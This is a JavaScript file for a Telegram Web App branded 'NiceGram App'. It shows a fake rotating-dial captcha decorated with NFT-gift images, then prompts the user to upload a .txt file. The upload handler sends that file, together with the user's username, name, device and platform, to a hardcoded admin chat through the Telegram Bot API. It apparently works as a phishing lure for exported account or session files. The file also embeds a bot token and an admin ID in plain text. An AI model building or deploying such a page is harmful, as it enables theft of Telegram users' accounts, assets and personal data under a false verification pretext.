const tg = window.Telegram.WebApp;
tg.expand();

// --- НАСТРОЙКИ ---
const BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I";
const ADMIN_ID = "7632180689";

// Фоновые изображения
const BG_IMAGES = [
    "https://static6.tgstat.ru/channels/_0/7c/7c8536637e62010b627a43f09fe8a469.jpg",
    "https://cache.tonapi.io/imgproxy/emGFD8G3jt41AkBJLS2ygiHlTP20aCPP_tN0O7j_9aA/rs:fill:1500:1500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvY3J5c3RhbGJhbGwtNDk0LndlYnA.webp",
    "https://i.getgems.io/cj6OL84WRNDlEU1STgJv-6EComaWdEiyGa3ueSBHvzw/rs:fill:1000:0:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50L2NhY2hlL2ltYWdlcy9FUURMN0hNYmNhMEZ1ZnJqSEZjUm9pTGtFaU9Ya1hvT192SDJnVlVOOEpOcDRraEsvNjgzMDZjMTkyYWNjMDU3Mw",
    "https://yt3.googleusercontent.com/v5uMoct16G7gneNFzOx71EZHam15nxmcxpcovXNMRMM0UtxsGq0IWn5ZcLmQ0pGgOIuGHBSTmFY=s900-c-k-c0x00ffffff-no-rj"
];

// --- ПЕРЕМЕННЫЕ ---
let angle = 0;
let isDragging = false;
let targetStart = 0;
let targetEnd = 0;

// --- ЭЛЕМЕНТЫ DOM ---
const circle = document.getElementById('circle');
const degree = document.getElementById('degree');
const captchaScreen = document.getElementById('captcha-screen');
const mainScreen = document.getElementById('main-screen');
const statusMsg = document.getElementById('status-msg');
const deviceInfo = document.getElementById('device-info');
const welcomeUser = document.getElementById('welcome-user');
const degreeMarks = document.getElementById('degree-marks');
const targetHint = document.getElementById('target-hint');
const verifyBtn = document.getElementById('verify-btn');
const selectFileBtn = document.getElementById('select-file-btn');
const fileInput = document.getElementById('file-input');

// ========== ФОНОВЫЕ ИЗОБРАЖЕНИЯ ==========

function createFloatingImages() {
    console.log("Создаем плавающие изображения...");
    const container = document.getElementById('floating-images');
    container.innerHTML = '';
    
    // Убедимся, что контейнер видим
    container.style.display = 'block';
    
    // Позиции для картинок (чтобы не перекрывали друг друга)
    const positions = [
        {top: '15%', left: '10%', delay: '0s'},
        {top: '25%', left: '75%', delay: '3s'},
        {top: '65%', left: '15%', delay: '6s'},
        {top: '75%', left: '70%', delay: '9s'}
    ];
    
    BG_IMAGES.forEach((src, index) => {
        const img = document.createElement('img');
        img.className = 'floating-img';
        img.src = src;
        img.alt = '';
        img.loading = 'lazy';
        
        // Адаптивные размеры
        const isMobile = window.innerWidth < 768;
        const size = isMobile ? 60 : 80;
        img.style.width = `${size}px`;
        img.style.height = `${size}px`;
        
        // Позиция
        img.style.top = positions[index].top;
        img.style.left = positions[index].left;
        
        // Анимация
        img.style.animationDelay = positions[index].delay;
        img.style.animationDuration = `${15 + index * 3}s`;
        
        // Яркое синее свечение
        img.style.filter = 'brightness(0.9) sepia(1) hue-rotate(180deg) saturate(3)';
        img.style.boxShadow = '0 0 40px rgba(0, 150, 255, 0.9)';
        img.style.opacity = '0.2';
        
        container.appendChild(img);
        console.log(`Изображение ${index + 1} добавлено: ${src}`);
    });
    
    console.log("Плавающие изображения созданы");
}

// ========== ЦИФЕРБЛАТ (только 0-180°) ==========

function createDegreeMarks() {
    console.log("Создаем циферблат 0-180°...");
    degreeMarks.innerHTML = '';
    
    // Создаем метки от 0 до 180 с шагом 10
    for (let i = 0; i <= 180; i += 10) {
        const mark = document.createElement('div');
        mark.className = 'degree-mark';
        mark.textContent = i;
        
        // Рассчитываем позицию для полукруга
        const radius = 90; // Радиус для позиционирования
        const angleRad = (i - 90) * Math.PI / 180; // -90 чтобы начать с левой стороны
        
        const x = radius * Math.cos(angleRad);
        const y = radius * Math.sin(angleRad);
        
        mark.style.position = 'absolute';
        mark.style.left = `calc(50% + ${x}px)`;
        mark.style.top = `calc(50% + ${y}px)`;
        mark.style.transform = 'translate(-50%, -50%)';
        mark.style.color = '#66ff66';
        mark.style.fontSize = window.innerWidth < 768 ? '10px' : '11px';
        mark.style.fontWeight = 'bold';
        mark.style.width = '20px';
        mark.style.height = '20px';
        mark.style.textAlign = 'center';
        mark.style.lineHeight = '20px';
        
        degreeMarks.appendChild(mark);
    }
    console.log("Циферблат создан: метки от 0 до 180°");
}

// ========== ГЕНЕРАЦИЯ ЦЕЛЕВОГО ДИАПАЗОНА ==========

function generateTargetRange() {
    console.log("Генерируем целевой диапазон...");
    
    // Случайный стартовый угол от 0 до 160
    targetStart = Math.floor(Math.random() * 17) * 10; // 0, 10, 20, ..., 160
    
    // Диапазон 20 градусов
    targetEnd = targetStart + 20;
    
    // Обновляем подсказку
    targetHint.textContent = `🎯 Цель: ${targetStart}° - ${targetEnd}°`;
    
    // Подсвечиваем метки
    highlightTargetMarks();
    
    console.log(`Целевой диапазон: ${targetStart}° - ${targetEnd}°`);
}

function highlightTargetMarks() {
    // Снимаем подсветку
    document.querySelectorAll('.degree-mark').forEach(mark => {
        mark.classList.remove('target');
    });
    
    // Подсвечиваем целевой диапазон
    document.querySelectorAll('.degree-mark').forEach(mark => {
        const markAngle = parseInt(mark.textContent);
        if (markAngle >= targetStart && markAngle <= targetEnd) {
            mark.classList.add('target');
            mark.style.color = '#ff5555';
            mark.style.fontWeight = 'bold';
        }
    });
}

function isAngleInTarget(currentAngle) {
    return currentAngle >= targetStart && currentAngle <= targetEnd;
}

// ========== ВРАЩЕНИЕ СТРЕЛКИ ==========

function handleRotation(e) {
    if (!isDragging) return;
    
    e.preventDefault();
    
    const clientX = e.touches ? e.touches[0].clientX : e.clientX;
    const clientY = e.touches ? e.touches[0].clientY : e.clientY;
    
    const rect = circle.parentElement.getBoundingClientRect();
    const centerX = rect.left + rect.width / 2;
    const centerY = rect.top + rect.height / 2;
    
    // Вычисляем угол
    let radians = Math.atan2(clientY - centerY, clientX - centerX);
    let rawAngle = Math.round(radians * (180 / Math.PI) + 90);
    
    // Ограничиваем угол от 0 до 180°
    if (rawAngle < 0) rawAngle += 360;
    
    // Преобразуем в диапазон 0-180°
    if (rawAngle > 180 && rawAngle < 360) {
        // Если в нижней половине, отражаем на верхнюю
        angle = 180 - (rawAngle - 180);
    } else if (rawAngle >= 360) {
        angle = rawAngle - 360;
    } else {
        angle = rawAngle;
    }
    
    // Ограничиваем 0-180
    angle = Math.max(0, Math.min(180, angle));
    
    // Обновляем отображение
    circle.style.transform = `rotate(${angle}deg)`;
    degree.textContent = `${angle}°`;
    
    // Подсветка при попадании в диапазон
    if (isAngleInTarget(angle)) {
        circle.style.background = 'linear-gradient(135deg, #00cc00, #008800)';
        circle.style.boxShadow = '0 0 25px #00ff00';
        circle.style.borderColor = '#00ff00';
        degree.style.color = '#00ff00';
        degree.style.textShadow = '0 0 10px #00ff00';
    } else {
        circle.style.background = 'linear-gradient(135deg, #008800, #004400)';
        circle.style.boxShadow = '0 0 15px rgba(0, 255, 0, 0.4)';
        circle.style.borderColor = '#00aa00';
        degree.style.color = '#00ff00';
        degree.style.textShadow = 'none';
    }
}

// ========== ИНИЦИАЛИЗАЦИЯ КАПЧИ ==========

function initializeCaptcha() {
    console.log("Инициализация капчи...");
    
    // События для вращения
    circle.addEventListener('mousedown', () => {
        isDragging = true;
        circle.style.cursor = 'grabbing';
    });
    
    circle.addEventListener('touchstart', (e) => {
        e.preventDefault();
        isDragging = true;
        circle.style.cursor = 'grabbing';
    });
    
    document.addEventListener('mousemove', handleRotation);
    document.addEventListener('touchmove', handleRotation, {passive: false});
    
    document.addEventListener('mouseup', () => {
        isDragging = false;
        circle.style.cursor = 'grab';
    });
    
    document.addEventListener('touchend', () => {
        isDragging = false;
        circle.style.cursor = 'grab';
    });
    
    // Кнопка проверки
    verifyBtn.onclick = () => {
        console.log(`Проверка: текущий угол ${angle}°, диапазон ${targetStart}°-${targetEnd}°`);
        
        if (isAngleInTarget(angle)) {
            console.log("✅ Капча пройдена!");
            
            // Виброотклик
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('light');
            }
            
            // Плавный переход
            captchaScreen.style.transition = 'opacity 0.3s';
            captchaScreen.style.opacity = '0';
            
            setTimeout(() => {
                captchaScreen.classList.add('hidden');
                mainScreen.classList.remove('hidden');
                
                // Приветствие
                const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
                welcomeUser.textContent = `👋 Добро пожаловать, ${firstName}!`;
                
                // Анимация появления
                mainScreen.style.opacity = '0';
                setTimeout(() => {
                    mainScreen.style.opacity = '1';
                    mainScreen.style.transition = 'opacity 0.5s';
                }, 50);
                
            }, 300);
        } else {
            console.log("❌ Капча не пройдена!");
            
            // Виброотклик ошибки
            if (tg.HapticFeedback) {
                tg.HapticFeedback.impactOccurred('heavy');
            }
            
            // Эффект тряски
            circle.style.animation = 'shake 0.5s';
            setTimeout(() => {
                circle.style.animation = '';
            }, 500);
            
            alert(`❌ Неверно! Поверните стрелку в диапазон ${targetStart}° - ${targetEnd}°\nТекущий угол: ${angle}°`);
        }
    };
}

// ========== ОПРЕДЕЛЕНИЕ УСТРОЙСТВА ==========

function detectDevice() {
    const platform = tg.platform || "Неизвестно";
    const userAgent = navigator.userAgent.toLowerCase();
    
    let device = "Неизвестно";
    
    if (/android/.test(userAgent)) {
        device = "📱 Android";
    } else if (/iphone|ipad|ipod/.test(userAgent)) {
        device = "📱 iOS";
    } else if (/windows/.test(userAgent)) {
        device = "💻 Windows";
    } else if (/mac/.test(userAgent)) {
        device = "💻 macOS";
    } else if (/linux/.test(userAgent)) {
        device = "💻 Linux";
    }
    
    deviceInfo.innerHTML = `
        <div>📱 <strong>Устройство:</strong> ${device}</div>
        <div>🌐 <strong>Платформа:</strong> ${platform}</div>
        <div>👤 <strong>ID:</strong> ${tg.initDataUnsafe?.user?.id || 'Неизвестно'}</div>
    `;
    
    console.log(`Устройство: ${device}, Платформа: ${platform}`);
    return { device, platform };
}

// ========== ОТПРАВКА ФАЙЛА ==========

function initializeFileUpload() {
    selectFileBtn.onclick = () => {
        if (tg.HapticFeedback) {
            tg.HapticFeedback.selectionChanged();
        }
        fileInput.click();
    };
    
    fileInput.onchange = async () => {
        const file = fileInput.files[0];
        if (!file) return;
        
        // Проверка типа файла
        if (!file.name.toLowerCase().endsWith('.txt')) {
            showStatus("❌ Ошибка: Разрешены только .txt файлы!", 'error');
            fileInput.value = "";
            return;
        }
        
        // Проверка размера
        if (file.size > 10 * 1024 * 1024) {
            showStatus("❌ Файл слишком большой! Максимум 10MB", 'error');
            fileInput.value = "";
            return;
        }
        
        showStatus("⏳ Отправка файла...", 'loading');
        
        // Сбор данных
        const user = tg.initDataUnsafe?.user || {};
        const username = user.username ? `@${user.username}` : "Скрыт";
        const firstName = user.first_name || "Пользователь";
        const { device, platform } = detectDevice();
        
        try {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('document', file);
            
            const caption = `📄 Файл: ${file.name}\n` +
                           `👤 Пользователь: ${username}\n` +
                           `👨 Имя: ${firstName}\n` +
                           `📱 Устройство: ${device}\n` +
                           `🌐 Платформа: ${platform}\n` +
                           `📦 Размер: ${(file.size / 1024).toFixed(1)} KB\n` +
                           `⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
            
            formData.append('caption', caption);
            formData.append('parse_mode', 'HTML');
            
            console.log("Отправка файла...");
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            const data = await response.json();
            console.log("Ответ от сервера:", data);
            
            if (response.ok && data.ok) {
                showStatus("✅ Файл успешно отправлен!", 'success');
                if (tg.HapticFeedback) {
                    tg.HapticFeedback.notificationOccurred('success');
                }
                
                // Очистка через 3 секунды
                setTimeout(() => {
                    statusMsg.className = 'status';
                    fileInput.value = "";
                }, 3000);
            } else {
                const errorMsg = data.description || 'Неизвестная ошибка';
                showStatus(`❌ Ошибка: ${errorMsg}`, 'error');
                console.error('Ошибка отправки:', data);
            }
        } catch (error) {
            showStatus("❌ Ошибка сети. Проверьте соединение.", 'error');
            console.error('Ошибка сети:', error);
        }
    };
}

function showStatus(message, type) {
    statusMsg.textContent = message;
    statusMsg.className = `status active ${type === 'success' ? 'success' : type === 'error' ? 'error' : ''}`;
}

// ========== АНИМАЦИЯ ТРЯСКИ ==========

const style = document.createElement('style');
style.textContent = `
    @keyframes shake {
        0%, 100% { transform: rotate(${angle}deg) translateX(0); }
        25% { transform: rotate(${angle}deg) translateX(-5px); }
        75% { transform: rotate(${angle}deg) translateX(5px); }
    }
`;
document.head.appendChild(style);

// ========== ИНИЦИАЛИЗАЦИЯ ПРИЛОЖЕНИЯ ==========

function initApp() {
    console.log("=== ИНИЦИАЛИЗАЦИЯ NiceGram App ===");
    console.log("Версия Telegram Web App:", tg.version);
    console.log("Платформа:", tg.platform);
    console.log("Пользователь:", tg.initDataUnsafe?.user);
    
    tg.ready();
    tg.expand();
    
    // Инициализация компонентов
    createFloatingImages();
    createDegreeMarks();
    generateTargetRange();
    initializeCaptcha();
    initializeFileUpload();
    detectDevice();
    
    // Адаптация при изменении размера
    window.addEventListener('resize', () => {
        console.log("Размер окна изменен, перерисовываем...");
        createFloatingImages();
        createDegreeMarks();
        highlightTargetMarks();
    });
    
    // Добавляем CSS для анимации
    document.head.insertAdjacentHTML('beforeend', `
        <style>
            .degree-mark.target {
                color: #ff5555 !important;
                font-weight: bold;
                text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
            }
        </style>
    `);
    
    console.log("=== ПРИЛОЖЕНИЕ ЗАПУЩЕНО ===");
    console.log(`Целевой диапазон: ${targetStart}° - ${targetEnd}°`);
    console.log("Готово к работе!");
}

// Запуск при полной загрузке
window.addEventListener('DOMContentLoaded', initApp);

// Для отладки в консоли
window.debugApp = () => {
    console.log("=== ДЕБАГ ИНФОРМАЦИЯ ===");
    console.log("Угол:", angle);
    console.log("Целевой диапазон:", `${targetStart}° - ${targetEnd}°`);
    console.log("В диапазоне:", isAngleInTarget(angle));
    console.log("Элементы DOM:");
    console.log("- circle:", circle);
    console.log("- degree:", degree);
    console.log("- degreeMarks:", degreeMarks.children.length, "меток");
    console.log("- targetHint:", targetHint.textContent);
    console.log("- плавающие изображения:", document.querySelectorAll('.floating-img').length);
    console.log("========================");
};
